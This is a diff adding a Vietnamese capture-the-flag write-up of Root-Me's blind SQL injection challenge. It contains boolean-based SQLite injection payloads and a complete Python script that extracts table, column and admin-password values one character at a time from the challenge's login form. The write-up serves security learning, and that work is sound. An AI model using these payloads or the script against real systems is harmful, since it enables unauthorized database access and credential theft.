@@ -288,10 +288,143 @@ Và cuối cùng thì để `lv` bằng với một giá trị nào đó mà nó
  <img src="https://user-images.githubusercontent.com/92881216/219342998-03d868ec-dc2f-42f5-84f7-49cc57b7f4b4.png" width=300px />
  
  
-  ## Rootme
-  ### SQL injection - Blind
-  `Description`: 1 form đăng nhập
-  
+## Rootme
+### SQL injection - Blind
+`Description`: 1 form đăng nhập
+
+<img src="https://user-images.githubusercontent.com/92881216/219631022-20fa06c9-b29a-45e9-9f6a-e464430058de.png" width=300px />
+
+Khi nhập vào user và passwd bất kỳ thì có lỗi xuất hiện `Error : no such user/password`:
+
+<img src="https://user-images.githubusercontent.com/92881216/219632146-85f229b3-f579-4b90-a8eb-5513694d9e48.png" width=300px />
+
+Sau đó tiếp tục thử các ký tự như `'` thì có lỗi sever trả về :
+
+<img src="https://user-images.githubusercontent.com/92881216/219632540-74019290-f582-41f7-81e9-ac2e1a00b3b0.png" width=300px />
+
+Tiếp tục thử với user là `' or 1=1; --` thì bất ngờ khi truy cập được vào `user1`: 
+
+<img src="https://user-images.githubusercontent.com/92881216/219633189-d54c6932-d4ab-4b88-ad84-798d78917ca8.png" width=300px />
+
+Sau đó tiếp tục thử với `'or 1=2; --` thì lỗi xuất hiện `Error : no such user/password`. Từ đó có hướng khai thác nếu câu truy vấn sau `or` đúng thì sẽ truy cập được vào tài khoản `user` sai sẽ báo lỗi.
+
+Như thông tin lỗi trên biết được server sử dụng `Sqlite`.
+
+Khai thác:
+
+- Xác định tên bảng trong sqlite:
+```
+SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+```
+Nhưng truy vấn không trả về kết quả mà chỉ biết đúng sai nên phải xác định độ dài tên bảng rồi truy xuất từng chữ trong tên bảng bằng payloads:
+
+```
+'or (length((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))={i});-- #i là độ dài tên bảng
+```
+
+```
+'or (substr((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{i},1)='{j}');-- # i là thứ tự trong tên bảng ứng với chữ cái j
+```
+
+- Sau khi xác định tên bảng thì xác định cột qua truy vấn:
+
+```
+SELECT name FROM pragma_table_info('{table_name}')
+```
+
+- Tương tự vậy khi xác định xong sẽ truy xuất ra giá trị trong cột
+
+
+`Script`:
+
+```
+import requests
+import string
+url="http://challenge01.root-me.org/web-serveur/ch10/"
+LETTERS=string.ascii_lowercase+string.ascii_uppercase+string.digits+'_'
+
+table_length=0
+for i in range(1,20):
+    data = {
+    'username': "'or (length((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))={});--".format(i),
+    'password': 'a'
+    }
+    res = requests.post(url, data= data)
+    if "user1" in res.text:
+        table_length=i
+        print('length of table:',table_length)
+        break
+table_name=""
+for i in range(1,table_length+1):
+    for j in LETTERS:
+        data = {
+        'username': "'or (substr((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{},1)='{}');--".format(i,j),
+        'password': 'a'
+        }
+        res = requests.post(url, data= data)
+        if "user1" in res.text:
+            table_name+=j
+            print('name of table :',table_name)
+            break
+column_length=0
+for i in range(1,30):
+    data = {
+    'username': "'or (length((SELECT name FROM pragma_table_info('{}') where name not like '%u%'))={});--".format(table_name,i),#dùng where tránh dump ra bảng username
+    'password': 'a'
+    }
+    res = requests.post(url, data= data)
+    if "user1" in res.text:
+        column_length=i
+        print('length of column:',column_length)
+        break
+column_name=''
+for i in range(1,column_length+1 ):
+    for j in LETTERS:
+        data = {
+        'username': "'or (substr((SELECT name FROM pragma_table_info('{}')  where name not like '%u%'),{},1)='{}');--".format(table_name,i,j),
+        'password': 'a'
+        }
+        res = requests.post(url, data= data)
+        if "user1" in res.text:
+            column_name+=j
+            print('name of column:',column_name)
+            break
+pw_length=0
+for i in range(1,30):
+    data = {
+    'username': "'or (length((SELECT password FROM {} where username = 'admin'))={});--".format(table_name,i),
+    'password': 'a'
+    }
+    res = requests.post(url, data= data)
+    if "user1" in res.text:
+        pw_length=i
+        print('length of password:',pw_length)
+        break
+pw=''
+for i in range(1,pw_length+1 ):
+    for j in LETTERS:
+        data = {
+        'username': "'or (substr((SELECT password FROM {} where username = 'admin'),{},1)='{}');--".format(table_name,i,j),
+        'password': 'a'
+        }
+        res = requests.post(url, data= data)
+        if "user1" in res.text:
+            pw+=j
+            print('pw:',pw)
+            break
+```
+
+`Kết quả`:
+
+<img src="https://user-images.githubusercontent.com/92881216/219638564-8375f028-4a0d-427b-8105-f6b6f4cca8b4.png" width=800px />
+
+
+<img src="https://user-images.githubusercontent.com/92881216/219638664-66b729a2-c27e-4f69-8315-3b371acb6347.png" width=350px />
+
+
+
+
+
 
 
  
